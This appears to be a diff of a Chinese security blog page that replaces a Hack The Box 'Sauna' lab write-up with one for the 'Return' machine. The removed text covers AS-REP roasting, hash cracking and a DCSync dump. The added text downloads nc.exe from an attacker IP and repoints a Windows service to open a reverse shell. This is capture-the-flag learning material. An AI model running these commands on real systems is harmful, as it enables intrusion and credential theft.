@@ -9,7 +9,7 @@
     
     <title>
         
-            htb Sauna复盘 |
+            htb return复盘 |
         
         Flowww&#39;s blog
     </title>
@@ -191,7 +191,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        htb Sauna复盘
+                        htb return复盘
                     </div>
                 
 
@@ -222,7 +222,7 @@
 
             <span class="meta-info-item post-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="datetime" data-updated="Tue Apr 09 2024 20:32:40 GMT+0800">2024-04-09</span>
+                <span class="datetime" data-updated="Tue Apr 09 2024 21:19:09 GMT+0800">2024-04-09</span>
             </span>
         
 
@@ -266,74 +266,31 @@
                 <div class="post-content keep-markdown-body">
                     
 
-                    <p>继续记录学习📑</p>
+                    <p>这个靶机比较简单，就边做边记录了📝</p>
 <h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>官方wp</p>
-<p><a class="link"   target="_blank" rel="noopener" href="http://111.229.75.150/2023/10/11/htb%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97-sauna%E5%86%85%E7%BD%91%E6%89%AB%E7%9B%B2%E7%AF%87/" >http://111.229.75.150/2023/10/11/htb%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97-sauna%E5%86%85%E7%BD%91%E6%89%AB%E7%9B%B2%E7%AF%87/<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://m.freebuf.com/articles/network/286137.html" >https://m.freebuf.com/articles/network/286137.html<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34801745/article/details/108136791" >https://blog.csdn.net/qq_34801745/article/details/108136791<i class="fas fa-external-link-alt"></i></a></p>
-<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   target="_blank" rel="noopener" href="https://app.hackthebox.com/machines/Sauna" >https://app.hackthebox.com/machines/Sauna<i class="fas fa-external-link-alt"></i></a></p>
-<p>难度：easy</p>
-<p>ip：<strong>10.10.10.175</strong></p>
-<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>先扫端口</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  -p- --min-rate=1000 -T4 -A 10.10.10.175</span><br></pre></td></tr></table></figure>
+<p><a class="link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/440073688" >https://zhuanlan.zhihu.com/p/440073688<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Purpose_7/article/details/128562358" >https://blog.csdn.net/Purpose_7/article/details/128562358<i class="fas fa-external-link-alt"></i></a></p>
+<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   target="_blank" rel="noopener" href="https://app.hackthebox.com/machines/Return" >https://app.hackthebox.com/machines/Return<i class="fas fa-external-link-alt"></i></a></p>
+<p>难度：我觉得比easy还easy</p>
+<p>ip：10.10.11.108</p>
+<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409204704.png"   style="zoom:50%;" >
 
-<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409184941.png"   style="zoom:30%;" >
+<p>扫到很多端口，先看看80端口，有个setting.php，起始长这样</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409204749.png" ></p>
+<p>像是在配置一个服务，需要填address，389对于ldap服务</p>
+<p>思路是把地址改成本地ip，本地开启监听389端口，点击update，收到一串密码</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409204957.png" ></p>
+<p>用来登录svc-printer账户，没想到第一个flag拿的这么轻松</p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>看一下svc-printer账户详情</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2021.03.47.png" ></p>
+<p>他有Server Operator权限，“<strong>Members of this group can start&#x2F;stop system services</strong>”</p>
+<p>那接下来的思路就是上传一个nc.exe，停止某个服务，修改某个服务的路径，再启动服务，就会反弹shell</p>
+<p>这里选的服务是Windows自带的卷影复制服务<code>vss</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://10.10.16.3/nc64.exe&#x27;,&#x27;C:\Users\svc-printer\desktop\nc.exe&#x27;)&quot;</span><br><span class="line"># 下载一个nc.exe</span><br><span class="line">sc.exe stop vss # 停止vss</span><br><span class="line">sc.exe config vss binPath=&quot;C:\Users\svc-printer\desktop\nc.exe -e cmd.exe 10.10.16.3 8888&quot; # 修改服务路径</span><br><span class="line">sc.exe start vss # 开启服务</span><br></pre></td></tr></table></figure>
 
-<p>扫出来有很多个端口，有kerberos+ldap等，大概率是域控，域名：EGOTISTICAL-BANK.LOCAL0.</p>
-<h5 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L \\\\10.10.10.175 -N</span><br></pre></td></tr></table></figure>
-
-<p>尝试smb匿名登陆，没发现什么东西</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409185909.png" ></p>
-<h5 id="ldap枚举"><a href="#ldap枚举" class="headerlink" title="ldap枚举"></a>ldap枚举</h5><p>对于389的ladp服务，存在一个匿名绑定功能，通过这个功能可以不通过身份认证查询用户、组和计算机信息，我们尝试使用<a class="link"   target="_blank" rel="noopener" href="https://github.com/ropnop/windapsearch" >windapsearch<i class="fas fa-external-link-alt"></i></a>看看能不能利用成功</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409190131.png" ></p>
-<p>没有什么收获</p>
-<h5 id="web端"><a href="#web端" class="headerlink" title="web端"></a>web端</h5><p>80端口有开放，可以访问到网页，提示是说有个about.html，里面有很多人名</p>
-<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409184647.png"   style="zoom:50%;" >
-
-<p>收集起来建一个user.txt，然后用<a class="link"   target="_blank" rel="noopener" href="https://github.com/urbanadventurer/username-anarchy" >username-anarchy<i class="fas fa-external-link-alt"></i></a>生成一个字典</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409184624.png" ></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./username-anarchy --input-file user.txt --select-format first,flast,first.last,firstl &gt; unames.txt</span><br></pre></td></tr></table></figure>
-
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409190453.png" ></p>
-<h5 id="立足点"><a href="#立足点" class="headerlink" title="立足点"></a>立足点</h5><p>用字典可以查看是否有用户不需要经过Kerberos预身份验证。如果存在那么我们就可以得到其密码hash</p>
-<blockquote>
-<p> Kerberos 预⾝份验证是⼀项安全功能，可防⽌密码猜测攻击。在某些情况下，应⽤程序需要为其服务帐⼾启⽤此设</p>
-<p>置。当不强制执⾏预认证时，可以直接发送虚拟认证请求。域控制器的密钥分发中⼼，（KDC）将检查⾝份验证服务请求（AS-REQ），验证⽤⼾信息并返回加密的票证授予票证（TGT）。 TGT 包含使⽤相应帐⼾的 NTLM 哈希加密的材料（时间戳）。可以从中派⽣出哈希值，该哈希值可以受到离线暴⼒攻击以泄露明⽂密码。</p>
-</blockquote>
-<p>这里用到impacket的脚本GetNPUsers.py</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /home/kali/impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile unames.txt  -outputfile hashes.asreproast -dc-ip 10.10.10.175</span><br></pre></td></tr></table></figure>
-
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409191257.png" ></p>
-<p>成功拿到一串hash，用hashcat爆破一下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt -o pass.txt /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure>
-
-<p>拿到密码</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409191433.png" ></p>
-<p>拿账号密码用Evil-WinRM登陆，拿到第一个flag</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409191657.png" ></p>
-<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>上传一个winPEASany.exe，运行看看有什么可以提取的</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2019.22.45.png" ></p>
-<p>发现一串密码和一个新的用户svc_loanmgr，拿着这个再次登陆</p>
-<p>用“net users svc_loanmgr”查看用户详细信息，发现是个Remote Management Users组</p>
-<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2019.47.54.png"   style="zoom:50%;" >
-
-<p>再看看这个组的情况，net localgroup “Remote Management Users”</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409195851.png" ></p>
-<p>“ Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.”</p>
-<p>该组成员具有远程管理系统的能力，权限达到管理，所以存在DCSync 攻击</p>
-<blockquote>
-<p>在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求。</p>
-<p>DCSync 是域渗透中经常会用到的技术，其被整合在了 Mimikatz 中。在 DCSync 功能出现之前，要想获得域用户的哈希，需要登录域控制器，在域控制器上执行代码才能获得域用户的哈希。</p>
-</blockquote>
-<p>使用secretsdump.py脚本复制权限为所有域⽤⼾显⽰ NTLM 哈希值。运⾏以下命令来转储主域管理员的密码哈希</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /home/kali/impacket/examples/secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user Administrator</span><br></pre></td></tr></table></figure>
-
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409200452.png" ></p>
-<p>成功拿到hash，然后再登陆，成功拿到管理员权限</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409201438.png" ></p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>思路：网页发现用户名–&gt;生成字典–&gt;查看是否有用户不需要Kerberos 预⾝份验证–&gt;拿到第一个账号密码–&gt;提权工具找到自动登录的账户密码–&gt;查看域内信息–&gt;发现DCSync 攻击–&gt;抓到管理员的hash–&gt;提权成功</p>
-<p>新的知识点：Kerberos 预⾝份验证，自动化提权检测工具，DCSync 攻击。。</p>
-<p>本来想试一下BloodHound查看域内信息，总是失败，不过看官方题解也能懂，可惜就记录不下来了</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409210956.png" ></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409211018.png" ></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>目前遇到最简单的windows靶机，虽然开了很多端口但是没什么用，学习到Server Operator权限相关内容，不错</p>
 
                 </div>
                 
@@ -368,31 +325,15 @@
                 
                     <div class="post-nav border-box">
                         
-                            <div class="prev-post">
-                                <a class="prev"
-                                   rel="prev"
-                                   href="/2024/04/09/htb-return%E5%A4%8D%E7%9B%98/"
-                                   title="htb return复盘"
-                                >
-                                    <span class="left arrow-icon flex-center">
-                                        <i class="fas fa-chevron-left"></i>
-                                    </span>
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">htb return复盘</span>
-                                        <span class="post-nav-item">上一篇</span>
-                                    </span>
-                                </a>
-                            </div>
-                        
                         
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2024/04/08/htb-Timelapse%E5%A4%8D%E7%9B%98/"
-                                   title="htb Timelapse复盘"
+                                   href="/2024/04/09/htb-Sauna%E5%A4%8D%E7%9B%98/"
+                                   title="htb Sauna复盘"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">htb Timelapse复盘</span>
+                                        <span class="post-nav-title-item text-ellipsis">htb Sauna复盘</span>
                                         <span class="post-nav-item">下一篇</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -420,7 +361,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.</span> <span class="nav-text">参考链接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">2.</span> <span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#smb"><span class="nav-number">3.1.</span> <span class="nav-text">smb</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ldap%E6%9E%9A%E4%B8%BE"><span class="nav-number">3.2.</span> <span class="nav-text">ldap枚举</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#web%E7%AB%AF"><span class="nav-number">3.3.</span> <span class="nav-text">web端</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%AB%8B%E8%B6%B3%E7%82%B9"><span class="nav-number">3.4.</span> <span class="nav-text">立足点</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.</span> <span class="nav-text">参考链接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">2.</span> <span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol>
     </div>
 </div>
 
@@ -583,7 +524,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.</span> <span class="nav-text">参考链接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">2.</span> <span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#smb"><span class="nav-number">3.1.</span> <span class="nav-text">smb</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ldap%E6%9E%9A%E4%B8%BE"><span class="nav-number">3.2.</span> <span class="nav-text">ldap枚举</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#web%E7%AB%AF"><span class="nav-number">3.3.</span> <span class="nav-text">web端</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%AB%8B%E8%B6%B3%E7%82%B9"><span class="nav-number">3.4.</span> <span class="nav-text">立足点</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.</span> <span class="nav-text">参考链接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">2.</span> <span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol>
     </div>
 </div>
 
